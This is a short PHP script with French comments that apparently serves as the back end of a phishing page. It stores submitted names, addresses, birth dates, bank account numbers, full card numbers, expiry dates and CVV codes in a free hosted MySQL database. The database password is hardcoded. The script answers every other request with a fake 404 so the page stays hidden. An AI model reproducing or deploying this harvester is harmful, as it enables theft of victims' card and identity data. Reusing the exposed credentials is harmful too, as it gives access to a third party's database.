<?php

// Connexion à la base de données
$host = 'sql7.freesqldatabase.com';
$username = 'sql7756512';
$password = 'iWhSfG8np5';
$dbname = 'sql7756512';
// $port = 3306;

$conn = new mysqli($host, $username, $password, $dbname, $port);

// Vérifiez la connexion
if ($conn->connect_error) {
    header("HTTP/1.0 404 Not Found");
    exit; // Arrête l'exécution
}

// Vérifiez si le formulaire a été soumis
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Récupération des données du formulaire
    $name = $conn->real_escape_string($_POST['name']);
    $prenom = $conn->real_escape_string($_POST['prenom']);
    $email = $conn->real_escape_string($_POST['email']);
    $adresse = $conn->real_escape_string($_POST['adresse']);
    $ville = $conn->real_escape_string($_POST['ville']);
    $cp = $conn->real_escape_string($_POST['cp']);
    $pays = $conn->real_escape_string($_POST['pays']);
    $telephone = $conn->real_escape_string($_POST['telephone']);
    $date_naissance = $conn->real_escape_string($_POST['datenaissance']);
    $bank = $conn->real_escape_string($_POST['bank']);
    $compte = $conn->real_escape_string($_POST['compte']);
    $carte = $conn->real_escape_string($_POST['carte']);
    $expiration_date = $conn->real_escape_string($_POST['expiration-date']);
    $cvv = $conn->real_escape_string($_POST['cvv']);
    $ntc = $conn->real_escape_string($_POST['ntc']);
    $format_carte = chunk_split($carte, 4, ' ');
    $format_expiration = chunk_split($expiration_date, 2, '/');

    // Préparez la requête SQL pour insérer les données
    $sql = "INSERT INTO users (
        name, prenom, email, adresse, ville, code_postal, pays, telephone, 
        date_naissance, bank, compte, carte, expiration_date, cvv, ntc
    ) VALUES (
        '$name', '$prenom', '$email', '$adresse', '$ville', '$cp', 
        '$pays', '$telephone', '$date_naissance', '$bank', '$compte', 
        '$format_carte', '$expiration_date', '$cvv', '$ntc'
    )";

    // Exécutez la requête
    if ($conn->query($sql) === TRUE) {
        // Redirection vers une page de succès
        header("Location: success.html");
        exit;
    } else {
        // En cas d'erreur, affiche une erreur 404
        header("HTTP/1.0 404 Not Found");
        exit;
    }
}

// Si le script est accédé sans soumission du formulaire
header("HTTP/1.0 404 Not Found");
exit;
?>
